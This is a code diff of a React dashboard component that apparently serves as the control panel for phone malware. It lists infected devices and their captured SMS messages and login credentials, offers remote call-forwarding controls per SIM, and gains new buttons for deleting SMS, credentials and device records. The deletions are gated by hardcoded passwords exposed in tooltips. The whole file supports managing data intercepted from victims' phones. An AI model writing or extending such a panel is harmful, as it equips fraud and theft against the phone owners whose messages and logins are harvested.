@@ -14,7 +14,8 @@ export default function DevicesPanel({
   showToast,
   openSmsModal,
   deleteAllSms,
-  deleteAllCredentials
+  deleteAllCredentials,
+  deleteAllDevices
 }) {
   const [searchQuery, setSearchQuery] = useState("");
   const [filter, setFilter] = useState("all");
@@ -211,13 +212,27 @@ export default function DevicesPanel({
     }
   };
 
+  // Card Level Data & Device Delete Handler
   const deleteDeviceData = (devId, type) => {
-    const pwd = prompt(`🔐 Enter Password to delete ${type}:`);
-    if (pwd !== "9090") return showToast("❌ Invalid Password", "error");
-    if (!confirm(`Delete ${type} for ${devId}?`)) return;
+    let targetPwd = "9090";
+    if (type === "sms") targetPwd = "1122";
+    else if (type === "credentials") targetPwd = "3344";
+    else if (type === "device") targetPwd = "5566";
 
-    const path = type === "sms" ? `user_sms/${devId}` : `login/${devId}`;
-    remove(ref(db, path)).then(() => showToast(`Deleted ${type}`, "success"));
+    const pwd = prompt(`🔐 Enter Password to delete ${type.toUpperCase()}:`);
+    if (pwd !== targetPwd) return showToast(`❌ Invalid Password for ${type}`, "error");
+    if (!confirm(`Are you sure you want to delete ${type} for ${devId}?`)) return;
+
+    if (type === "sms") {
+      remove(ref(db, `user_sms/${devId}`)).then(() => showToast(`Deleted SMS for ${devId}`, "success"));
+    } else if (type === "credentials") {
+      remove(ref(db, `login/${devId}`)).then(() => showToast(`Deleted Credentials for ${devId}`, "success"));
+    } else if (type === "device") {
+      Promise.all([
+        remove(ref(db, `user_data/${devId}`)),
+        remove(ref(db, `device_status/${devId}`))
+      ]).then(() => showToast(`Device ${devId} removed`, "success"));
+    }
   };
 
   const onlineCount = Object.values(deviceOnlineStatus).filter(Boolean).length;
@@ -259,9 +274,23 @@ export default function DevicesPanel({
         )}
       </div>
 
+      {/* TOP ACTION BUTTONS BAR */}
       <div style={{ marginBottom: 12, display: "flex", justifyContent: "flex-end", gap: 8, flexWrap: "wrap" }}>
-        <button className="btn-delete-all" onClick={deleteAllSms}><i className="fas fa-trash-alt"></i> Delete All SMS</button>
-        <button className="btn-delete-all credential" onClick={deleteAllCredentials}><i className="fas fa-key"></i> Delete All Credentials</button>
+        <button className="btn-delete-all" onClick={deleteAllSms} title="Password: 1122">
+          <i className="fas fa-trash-alt"></i> Delete All SMS
+        </button>
+        <button className="btn-delete-all credential" onClick={deleteAllCredentials} title="Password: 3344">
+          <i className="fas fa-key"></i> Delete All Credentials
+        </button>
+        {/* NAYA BUTTON: DELETE ALL DEVICES */}
+        <button 
+          className="btn-delete-all" 
+          onClick={deleteAllDevices} 
+          title="Password: 5566"
+          style={{ background: "rgba(220, 38, 38, 0.2)", borderColor: "var(--red)" }}
+        >
+          <i className="fas fa-mobile-alt"></i> Delete All Devices
+        </button>
       </div>
 
       <div id="devicesContainer">
@@ -557,14 +586,13 @@ export default function DevicesPanel({
                     </div>
                   )}
 
-                  {/* CALL FORWARD TAB (SIM 1 / SIM 2 SELECTOR + PERMANENT NUMBER) */}
+                  {/* Call Forward Command */}
                   {curTab === "fwd" && (
                     <div className="section-premium" style={{ background: "rgba(12, 16, 26, 0.8)", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 10, padding: 14 }}>
                       <div style={{ fontSize: 13, fontWeight: 600, color: "var(--text-primary)", marginBottom: 12, display: "flex", alignItems: "center", gap: 6 }}>
                         <i className="fas fa-tools" style={{ color: "var(--gold)" }}></i> Call Forward Controls
                       </div>
 
-                      {/* Forward Number Input */}
                       <input 
                         type="text" 
                         placeholder="Forward To Phone Number" 
@@ -582,7 +610,6 @@ export default function DevicesPanel({
                         onChange={(e) => updateMemoryField(`fwdNum-${devId}`, e.target.value)}
                       />
 
-                      {/* SIM 1 / SIM 2 Dropdown Selector */}
                       <div style={{ marginBottom: 14 }}>
                         <select
                           className="luxury-select"
@@ -604,7 +631,6 @@ export default function DevicesPanel({
                         </select>
                       </div>
 
-                      {/* ON & OFF Buttons */}
                       <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
                         <button 
                           type="button"
@@ -658,12 +684,15 @@ export default function DevicesPanel({
                   {curTab === "delete" && (
                     <div className="section-premium" style={{ borderColor: "var(--red)" }}>
                       <div className="section-title" style={{ color: "var(--red)" }}>Danger Zone</div>
-                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 8 }}>
-                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "sms")}>
+                      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr 1fr", gap: 6 }}>
+                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px" }} onClick={() => deleteDeviceData(devId, "sms")}>
                           Delete SMS
                         </button>
-                        <button type="button" className="btn-luxury btn-purple" style={{ justifyContent: "center" }} onClick={() => deleteDeviceData(devId, "credentials")}>
+                        <button type="button" className="btn-luxury btn-purple" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px" }} onClick={() => deleteDeviceData(devId, "credentials")}>
                           Delete Creds
+                        </button>
+                        <button type="button" className="btn-luxury btn-red" style={{ justifyContent: "center", fontSize: 10, padding: "8px 4px", background: "#7f1d1d" }} onClick={() => deleteDeviceData(devId, "device")}>
+                          Delete Device
                         </button>
                       </div>
                     </div>
